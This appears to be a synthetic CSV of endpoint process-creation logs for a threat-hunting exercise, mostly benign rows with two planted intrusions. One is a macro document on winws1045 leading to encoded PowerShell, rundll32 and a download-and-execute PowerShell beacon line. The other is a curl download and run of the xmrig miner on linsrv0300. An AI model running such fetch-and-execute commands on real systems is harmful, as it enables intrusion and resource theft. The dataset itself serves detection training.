Hostname,Username,ProcessName,ProcessID,ParentProcessName,ParentProcessID,CommandLine,EventTimestamp
winws0256,j.doe,msedge.exe,23701,explorer.exe,7030,null,2025-09-15 08:47:03.456345 UTC
winws0248,j.doe,msedge.exe,22701,explorer.exe,6810,null,2025-09-15 08:45:03.123012 UTC
winws0169,j.doe,msedge.exe,12701,explorer.exe,4610,null,2025-09-15 08:25:03.789678 UTC
winws1210,j.doe,svchost.exe,2300,services.exe,500,null,2025-09-15 08:23:00.123012 UTC
winws1230,j.doe,svchost.exe,3800,services.exe,500,null,2025-09-15 08:28:00.456345 UTC
winws1250,j.doe,svchost.exe,5300,services.exe,500,null,2025-09-15 08:33:00.789678 UTC
winws1290,j.doe,svchost.exe,8300,services.exe,500,null,2025-09-15 08:43:00.456345 UTC
winws0090,j.doe,svchost.exe,1700,services.exe,500,null,2025-09-15 08:20:57.456345 UTC
winws1270,j.doe,svchost.exe,6800,services.exe,500,null,2025-09-15 08:38:00.123012 UTC
winws1233,j.doe,teams.exe,14601,explorer.exe,5030,null,2025-09-15 08:28:51.123012 UTC
winws0143,j.doe,teams.exe,23901,explorer.exe,7070,null,2025-09-15 08:47:27.123012 UTC
winws0189,j.doe,teams.exe,15201,explorer.exe,5160,null,2025-09-15 08:30:03.123012 UTC
winws0095,j.doe,teams.exe,11901,explorer.exe,4430,null,2025-09-15 08:23:27.123012 UTC
winws0228,j.doe,teams.exe,20201,explorer.exe,6260,null,2025-09-15 08:40:03.789678 UTC
winws0135,j.doe,teams.exe,21901,explorer.exe,6630,null,2025-09-15 08:43:27.456345 UTC
winws1273,j.doe,teams.exe,19601,explorer.exe,6130,null,2025-09-15 08:38:51.789678 UTC
winws0115,j.doe,teams.exe,16901,explorer.exe,5530,null,2025-09-15 08:33:27.789678 UTC
winws1045,m.chen,powershell.exe,6310,winword.exe,6200,powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACgAIgBpAG4AdgBpAG4AbgAZQByACAAcwBjAHIAaQBwAHQAIgApADsA,2025-09-15 08:07:35.121212 UTC
winws1045,m.chen,rundll32.exe,6400,powershell.exe,6310,"rundll32.exe C:\Users\m.chen\AppData\Local\Temp\update.dat,EntryPoint",2025-09-15 08:07:38.454545 UTC
winws1045,m.chen,powershell.exe,7100,rundll32.exe,6400,"powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2-backup-server.org/beacon.ps1')""",2025-09-15 08:08:00.998877 UTC
winws1045,m.chen,outlook.exe,5150,explorer.exe,4100,null,2025-09-15 08:06:00.112233 UTC
winws1045,m.chen,winword.exe,6200,outlook.exe,5150,C:\Users\m.chen\Downloads\invoice-document-share.docm,2025-09-15 08:07:30.556677 UTC
winws1227,m.chen,chrome.exe,13801,explorer.exe,4860,null,2025-09-15 08:27:21.123012 UTC
winws0097,m.chen,chrome.exe,12401,explorer.exe,4540,null,2025-09-15 08:24:27.789678 UTC
winws1067,m.chen,chrome.exe,15501,explorer.exe,5230,null,2025-09-15 08:30:42.456345 UTC
winws0137,m.chen,chrome.exe,22401,explorer.exe,6740,null,2025-09-15 08:44:27.123012 UTC
winws1237,m.chen,chrome.exe,15101,explorer.exe,5140,null,2025-09-15 08:29:51.789678 UTC
winws1087,m.chen,chrome.exe,20501,explorer.exe,6330,null,2025-09-15 08:40:42.123012 UTC
winws1267,m.chen,chrome.exe,18801,explorer.exe,5960,null,2025-09-15 08:37:21.789678 UTC
winws1277,m.chen,chrome.exe,20101,explorer.exe,6240,null,2025-09-15 08:39:51.456345 UTC
winws0145,m.chen,chrome.exe,24401,explorer.exe,7180,null,2025-09-15 08:48:27.789678 UTC
winws0149,m.chen,chrome.exe,25401,explorer.exe,7400,null,2025-09-15 08:50:27.123012 UTC
winws0117,m.chen,chrome.exe,17401,explorer.exe,5640,null,2025-09-15 08:34:27.456345 UTC
winws0112,m.chen,explorer.exe,5370,services.exe,500,null,2025-09-15 08:31:57.789678 UTC
winws1244,m.chen,explorer.exe,5320,services.exe,500,null,2025-09-15 08:31:30.789678 UTC
winws0219,m.chen,explorer.exe,6010,services.exe,500,null,2025-09-15 08:37:48.789678 UTC
winws0122,m.chen,explorer.exe,5920,services.exe,500,null,2025-09-15 08:36:57.123012 UTC
winws1204,m.chen,explorer.exe,4220,services.exe,500,null,2025-09-15 08:21:30.123012 UTC
winws1224,m.chen,explorer.exe,4770,services.exe,500,null,2025-09-15 08:26:30.456345 UTC
winws0190,m.chen,explorer.exe,5180,services.exe,500,null,2025-09-15 08:30:18.789678 UTC
winws0148,m.chen,explorer.exe,7350,services.exe,500,null,2025-09-15 08:49:57.789678 UTC
winws0239,m.chen,explorer.exe,6560,services.exe,500,null,2025-09-15 08:42:48.123012 UTC
winws0203,m.chen,explorer.exe,5550,services.exe,500,null,2025-09-15 08:33:33.456345 UTC
winws0180,m.chen,explorer.exe,4910,services.exe,500,null,2025-09-15 08:27:48.123012 UTC
winws0209,m.chen,explorer.exe,5730,services.exe,500,null,2025-09-15 08:35:18.123012 UTC
winws1072,m.chen,explorer.exe,5500,services.exe,500,null,2025-09-15 08:33:12.123012 UTC
winws0132,m.chen,explorer.exe,6470,services.exe,500,null,2025-09-15 08:41:57.456345 UTC
winws0249,m.chen,explorer.exe,6830,services.exe,500,null,2025-09-15 08:45:18.789678 UTC
winws0153,m.chen,explorer.exe,4170,services.exe,500,null,2025-09-15 08:21:03.123012 UTC
winws0163,m.chen,explorer.exe,4450,services.exe,500,null,2025-09-15 08:23:33.789678 UTC
winws1052,m.chen,explorer.exe,4400,services.exe,500,null,2025-09-15 08:23:12.456345 UTC
winws0258,m.chen,explorer.exe,7090,services.exe,500,null,2025-09-15 08:47:33.789678 UTC
winws0200,m.chen,explorer.exe,5460,services.exe,500,null,2025-09-15 08:32:48.456345 UTC
winws0102,m.chen,explorer.exe,4820,services.exe,500,null,2025-09-15 08:26:57.456345 UTC
winws1284,m.chen,explorer.exe,6420,services.exe,500,null,2025-09-15 08:41:30.456345 UTC
winws1082,m.chen,explorer.exe,6050,services.exe,500,null,2025-09-15 08:38:12.456345 UTC
winws0170,m.chen,explorer.exe,4630,services.exe,500,null,2025-09-15 08:25:18.456345 UTC
winws0222,m.chen,explorer.exe,6100,services.exe,500,null,2025-09-15 08:38:33.789678 UTC
winws0092,m.chen,explorer.exe,4270,services.exe,500,null,2025-09-15 08:21:57.123012 UTC
winws0183,m.chen,explorer.exe,5000,services.exe,500,null,2025-09-15 08:28:33.123012 UTC
winws1092,m.chen,explorer.exe,6600,services.exe,500,null,2025-09-15 08:43:12.789678 UTC
winws0242,m.chen,explorer.exe,6650,services.exe,500,null,2025-09-15 08:43:33.123012 UTC
winws0229,m.chen,explorer.exe,6280,services.exe,500,null,2025-09-15 08:40:18.456345 UTC
winws1264,m.chen,explorer.exe,5870,services.exe,500,null,2025-09-15 08:36:30.123012 UTC
winws0160,m.chen,explorer.exe,4360,services.exe,500,null,2025-09-15 08:22:48.789678 UTC
winws1062,m.chen,explorer.exe,4950,services.exe,500,null,2025-09-15 08:28:12.789678 UTC
winws1045,m.chen,explorer.exe,4100,services.exe,500,null,2025-09-15 08:05:20.321456 UTC
winws0232,m.chen,msedge.exe,20701,explorer.exe,6370,null,2025-09-15 08:41:03.456345 UTC
winws1287,m.chen,msedge.exe,21301,explorer.exe,6510,null,2025-09-15 08:42:21.123012 UTC
winws1077,m.chen,msedge.exe,18001,explorer.exe,5780,null,2025-09-15 08:35:42.789678 UTC
winws1247,m.chen,msedge.exe,16301,explorer.exe,5410,null,2025-09-15 08:32:21.456345 UTC
winws0193,m.chen,msedge.exe,15701,explorer.exe,5270,null,2025-09-15 08:31:03.789678 UTC
winws1207,m.chen,msedge.exe,11301,explorer.exe,4310,null,2025-09-15 08:22:21.789678 UTC
winws1097,m.chen,msedge.exe,23001,explorer.exe,6880,null,2025-09-15 08:45:42.456345 UTC
winws1303,m.chen,msedge.exe,23301,explorer.exe,6950,null,2025-09-15 08:46:21.789678 UTC
winws1057,m.chen,msedge.exe,13001,explorer.exe,4680,null,2025-09-15 08:25:42.123012 UTC
winws1302,m.chen,svchost.exe,9200,services.exe,500,null,2025-09-15 08:46:00.456345 UTC
winws1274,m.chen,svchost.exe,7100,services.exe,500,null,2025-09-15 08:39:00.789678 UTC
winws1294,m.chen,svchost.exe,8600,services.exe,500,null,2025-09-15 08:44:00.123012 UTC
winws1254,m.chen,svchost.exe,5600,services.exe,500,null,2025-09-15 08:34:00.456345 UTC
winws1234,m.chen,svchost.exe,4100,services.exe,500,null,2025-09-15 08:29:00.123012 UTC
winws1214,m.chen,svchost.exe,2600,services.exe,500,null,2025-09-15 08:24:00.789678 UTC
winws1310,m.chen,svchost.exe,9800,services.exe,500,null,2025-09-15 08:48:00.789678 UTC
winws1047,m.chen,svchost.exe,1600,services.exe,500,null,2025-09-15 08:20:42.789678 UTC
winws1313,m.chen,teams.exe,24601,explorer.exe,7230,null,2025-09-15 08:48:51.456345 UTC
winws1257,m.chen,teams.exe,17601,explorer.exe,5690,null,2025-09-15 08:34:51.123012 UTC
winws0173,m.chen,teams.exe,13201,explorer.exe,4720,null,2025-09-15 08:26:03.456345 UTC
winws1217,m.chen,teams.exe,12601,explorer.exe,4590,null,2025-09-15 08:24:51.456345 UTC
winws0107,m.chen,teams.exe,14901,explorer.exe,5090,null,2025-09-15 08:29:27.123012 UTC
winws0127,m.chen,teams.exe,19901,explorer.exe,6190,null,2025-09-15 08:39:27.789678 UTC
winws0212,m.chen,teams.exe,18201,explorer.exe,5820,null,2025-09-15 08:36:03.123012 UTC
winws1297,m.chen,teams.exe,22601,explorer.exe,6790,null,2025-09-15 08:44:51.789678 UTC
winws0147,m.chen,teams.exe,24901,explorer.exe,7290,null,2025-09-15 08:49:27.456345 UTC
winws1305,m.chen,teams.exe,23601,explorer.exe,7010,null,2025-09-15 08:46:51.123012 UTC
winws1083,p.patel,chrome.exe,19501,explorer.exe,6110,null,2025-09-15 08:38:42.789678 UTC
winws1219,p.patel,chrome.exe,12801,explorer.exe,4640,null,2025-09-15 08:25:21.789678 UTC
winws1063,p.patel,chrome.exe,14501,explorer.exe,5010,null,2025-09-15 08:28:42.123012 UTC
winws0113,p.patel,chrome.exe,16401,explorer.exe,5420,null,2025-09-15 08:32:27.123012 UTC
winws1229,p.patel,chrome.exe,14101,explorer.exe,4920,null,2025-09-15 08:27:51.456345 UTC
winws0093,p.patel,chrome.exe,11401,explorer.exe,4320,null,2025-09-15 08:22:27.456345 UTC
winws0152,p.patel,chrome.exe,10601,explorer.exe,4140,null,2025-09-15 08:20:48.456345 UTC
winws1259,p.patel,chrome.exe,17801,explorer.exe,5740,null,2025-09-15 08:35:21.456345 UTC
winws0133,p.patel,chrome.exe,21401,explorer.exe,6520,null,2025-09-15 08:42:27.789678 UTC
winws1269,p.patel,chrome.exe,19101,explorer.exe,6020,null,2025-09-15 08:37:51.123012 UTC
winws1299,p.patel,chrome.exe,22801,explorer.exe,6840,null,2025-09-15 08:45:21.123012 UTC
winws0221,p.patel,explorer.exe,6060,services.exe,500,null,2025-09-15 08:38:18.123012 UTC
winws1048,p.patel,explorer.exe,4180,services.exe,500,null,2025-09-15 08:21:12.123012 UTC
winws1312,p.patel,explorer.exe,7190,services.exe,500,null,2025-09-15 08:48:30.123012 UTC
winws0211,p.patel,explorer.exe,5790,services.exe,500,null,2025-09-15 08:35:48.456345 UTC
winws0202,p.patel,explorer.exe,5510,services.exe,500,null,2025-09-15 08:33:18.789678 UTC
winws0098,p.patel,explorer.exe,4600,services.exe,500,null,2025-09-15 08:24:57.123012 UTC
winws0182,p.patel,explorer.exe,4960,services.exe,500,null,2025-09-15 08:28:18.456345 UTC
winws0175,p.patel,explorer.exe,4780,services.exe,500,null,2025-09-15 08:26:33.789678 UTC
winws0265,p.patel,explorer.exe,7270,services.exe,500,null,2025-09-15 08:49:18.456345 UTC
winws0118,p.patel,explorer.exe,5700,services.exe,500,null,2025-09-15 08:34:57.789678 UTC
winws0214,p.patel,explorer.exe,5880,services.exe,500,null,2025-09-15 08:36:33.456345 UTC
winws0192,p.patel,explorer.exe,5240,services.exe,500,null,2025-09-15 08:30:48.123012 UTC
winws0231,p.patel,explorer.exe,6340,services.exe,500,null,2025-09-15 08:40:48.789678 UTC
winws1068,p.patel,explorer.exe,5280,services.exe,500,null,2025-09-15 08:31:12.789678 UTC
winws1098,p.patel,explorer.exe,6930,services.exe,500,null,2025-09-15 08:46:12.789678 UTC
winws1236,p.patel,explorer.exe,5100,services.exe,500,null,2025-09-15 08:29:30.456345 UTC
winws0146,p.patel,explorer.exe,7240,services.exe,500,null,2025-09-15 08:48:57.123012 UTC
winws1304,p.patel,explorer.exe,6970,services.exe,500,null,2025-09-15 08:46:30.789678 UTC
winws1078,p.patel,explorer.exe,5830,services.exe,500,null,2025-09-15 08:36:12.123012 UTC
winws1058,p.patel,explorer.exe,4730,services.exe,500,null,2025-09-15 08:26:12.456345 UTC
winws1088,p.patel,explorer.exe,6380,services.exe,500,null,2025-09-15 08:41:12.456345 UTC
winws0172,p.patel,explorer.exe,4690,services.exe,500,null,2025-09-15 08:25:48.789678 UTC
winws0142,p.patel,explorer.exe,7020,services.exe,500,null,2025-09-15 08:46:57.789678 UTC
winws0155,p.patel,explorer.exe,4230,services.exe,500,null,2025-09-15 08:21:33.456345 UTC
winws0138,p.patel,explorer.exe,6800,services.exe,500,null,2025-09-15 08:44:57.456345 UTC
winws0257,p.patel,explorer.exe,7050,services.exe,500,null,2025-09-15 08:47:18.123012 UTC
winws0251,p.patel,explorer.exe,6890,services.exe,500,null,2025-09-15 08:45:48.123012 UTC
winws0128,p.patel,explorer.exe,6250,services.exe,500,null,2025-09-15 08:39:57.123012 UTC
winws1320,p.patel,explorer.exe,7410,services.exe,500,null,2025-09-15 08:50:30.456345 UTC
winws0195,p.patel,explorer.exe,5330,services.exe,500,null,2025-09-15 08:31:33.123012 UTC
winws0162,p.patel,explorer.exe,4410,services.exe,500,null,2025-09-15 08:23:18.123012 UTC
winws0241,p.patel,explorer.exe,6610,services.exe,500,null,2025-09-15 08:43:18.456345 UTC
winws1216,p.patel,explorer.exe,4550,services.exe,500,null,2025-09-15 08:24:30.123012 UTC
winws1296,p.patel,explorer.exe,6750,services.exe,500,null,2025-09-15 08:44:30.456345 UTC
winws1276,p.patel,explorer.exe,6200,services.exe,500,null,2025-09-15 08:39:30.123012 UTC
winws0108,p.patel,explorer.exe,5150,services.exe,500,null,2025-09-15 08:29:57.456345 UTC
winws0234,p.patel,explorer.exe,6430,services.exe,500,null,2025-09-15 08:41:33.789678 UTC
winws1101,p.patel,msedge.exe,24001,explorer.exe,7100,null,2025-09-15 08:47:42.789678 UTC
winws1073,p.patel,msedge.exe,17001,explorer.exe,5560,null,2025-09-15 08:33:42.456345 UTC
winws1279,p.patel,msedge.exe,20301,explorer.exe,6290,null,2025-09-15 08:40:21.789678 UTC
winws1046,p.patel,msedge.exe,10201,explorer.exe,4060,null,2025-09-15 08:15:22.321654 UTC
winws0224,p.patel,msedge.exe,19701,explorer.exe,6150,null,2025-09-15 08:39:03.123012 UTC
winws1105,p.patel,msedge.exe,25001,explorer.exe,7320,null,2025-09-15 08:49:42.123012 UTC
winws0185,p.patel,msedge.exe,14701,explorer.exe,5050,null,2025-09-15 08:29:03.456345 UTC
winws1239,p.patel,msedge.exe,15301,explorer.exe,5190,null,2025-09-15 08:30:21.123012 UTC
winws1053,p.patel,msedge.exe,12001,explorer.exe,4460,null,2025-09-15 08:23:42.789678 UTC
winws1093,p.patel,msedge.exe,22001,explorer.exe,6660,null,2025-09-15 08:43:42.123012 UTC
winws1266,p.patel,svchost.exe,6500,services.exe,500,null,2025-09-15 08:37:00.456345 UTC
winws1206,p.patel,svchost.exe,2000,services.exe,500,null,2025-09-15 08:22:00.456345 UTC
winws1226,p.patel,svchost.exe,3500,services.exe,500,null,2025-09-15 08:27:00.789678 UTC
winws1246,p.patel,svchost.exe,5000,services.exe,500,null,2025-09-15 08:32:00.123012 UTC
winws1286,p.patel,svchost.exe,8000,services.exe,500,null,2025-09-15 08:42:00.789678 UTC
winws0165,p.patel,teams.exe,12201,explorer.exe,4500,null,2025-09-15 08:24:03.123012 UTC
winws0244,p.patel,teams.exe,22201,explorer.exe,6700,null,2025-09-15 08:44:03.456345 UTC
winws0268,p.patel,teams.exe,25201,explorer.exe,7360,null,2025-09-15 08:50:03.456345 UTC
winws1209,p.patel,teams.exe,11601,explorer.exe,4370,null,2025-09-15 08:22:51.123012 UTC
winws1289,p.patel,teams.exe,21601,explorer.exe,6570,null,2025-09-15 08:42:51.456345 UTC
winws0205,p.patel,teams.exe,17201,explorer.exe,5600,null,2025-09-15 08:34:03.789678 UTC
winws0260,p.patel,teams.exe,24201,explorer.exe,7140,null,2025-09-15 08:48:03.123012 UTC
winws0123,p.patel,teams.exe,18901,explorer.exe,5970,null,2025-09-15 08:37:27.456345 UTC
winws1249,p.patel,teams.exe,16601,explorer.exe,5470,null,2025-09-15 08:32:51.789678 UTC
winws0103,p.patel,teams.exe,13901,explorer.exe,4870,null,2025-09-15 08:27:27.789678 UTC
linsrv0300,svc_api,curl,2200,bash,2150,curl -o /tmp/xmrig http://data-miner-pool.net/xmrig,2025-09-15 08:16:15.456234 UTC
linsrv0300,svc_api,chmod,2201,bash,2150,chmod +x /tmp/xmrig,2025-09-15 08:16:18.789567 UTC
linapp0103,svc_api,gunicorn,11401,systemd,1,null,2025-09-15 08:20:39.456345 UTC
linsrv0300,svc_api,bash,2150,sshd,2100,null,2025-09-15 08:16:10.12389 UTC
linsrv0300,svc_api,xmrig,2205,bash,2150,./tmp/xmrig -o 185.125.190.22:4444 -u (wallet) -p x,2025-09-15 08:16:20.123901 UTC
linsrv0300,svc_api,sshd,2100,systemd,1,null,2025-09-15 08:16:00.789456 UTC
linapp0132,svc_api,java,14301,systemd,1,null,2025-09-15 08:35:06.789678 UTC
linapp0120,svc_api,java,13101,systemd,1,null,2025-09-15 08:29:06.789678 UTC
linapp0124,svc_api,java,13501,systemd,1,null,2025-09-15 08:31:06.123012 UTC
linapp0142,svc_api,java,15301,systemd,1,null,2025-09-15 08:40:06.123012 UTC
linapp0154,svc_api,java,16501,systemd,1,null,2025-09-15 08:46:06.123012 UTC
linapp0128,svc_api,java,13901,systemd,1,null,2025-09-15 08:33:06.456345 UTC
linapp0152,svc_api,java,16301,systemd,1,null,2025-09-15 08:45:06.456345 UTC
linapp0134,svc_api,java,14501,systemd,1,null,2025-09-15 08:36:06.456345 UTC
linapp0104,svc_api,java,11501,systemd,1,null,2025-09-15 08:21:06.456345 UTC
linapp0101,svc_api,java,11201,systemd,1,null,2025-09-15 08:05:12.456789 UTC
linapp0106,svc_api,java,11701,systemd,1,null,2025-09-15 08:22:06.123012 UTC
linapp0160,svc_api,java,17101,systemd,1,null,2025-09-15 08:49:06.123012 UTC
linapp0116,svc_api,java,12701,systemd,1,null,2025-09-15 08:27:06.456345 UTC
linapp0126,svc_api,java,13701,systemd,1,null,2025-09-15 08:32:06.789678 UTC
linapp0156,svc_api,java,16701,systemd,1,null,2025-09-15 08:47:06.789678 UTC
linapp0112,svc_api,java,12301,systemd,1,null,2025-09-15 08:25:06.123012 UTC
linapp0144,svc_api,java,15501,systemd,1,null,2025-09-15 08:41:06.789678 UTC
linapp0138,svc_api,java,14901,systemd,1,null,2025-09-15 08:38:06.789678 UTC
linapp0118,svc_api,java,12901,systemd,1,null,2025-09-15 08:28:06.123012 UTC
linapp0110,svc_api,java,12101,systemd,1,null,2025-09-15 08:24:06.456345 UTC
linapp0136,svc_api,java,14701,systemd,1,null,2025-09-15 08:37:06.123012 UTC
linapp0150,svc_api,java,16101,systemd,1,null,2025-09-15 08:44:06.789678 UTC
linapp0140,svc_api,java,15101,systemd,1,null,2025-09-15 08:39:06.456345 UTC
linapp0148,svc_api,java,15901,systemd,1,null,2025-09-15 08:43:06.123012 UTC
linapp0158,svc_api,java,16901,systemd,1,null,2025-09-15 08:48:06.456345 UTC
linapp0108,svc_api,java,11901,systemd,1,null,2025-09-15 08:23:06.789678 UTC
linapp0162,svc_api,java,17301,systemd,1,null,2025-09-15 08:50:06.789678 UTC
linapp0122,svc_api,java,13301,systemd,1,null,2025-09-15 08:30:06.456345 UTC
linapp0114,svc_api,java,12501,systemd,1,null,2025-09-15 08:26:06.789678 UTC
linapp0130,svc_api,java,14101,systemd,1,null,2025-09-15 08:34:06.123012 UTC
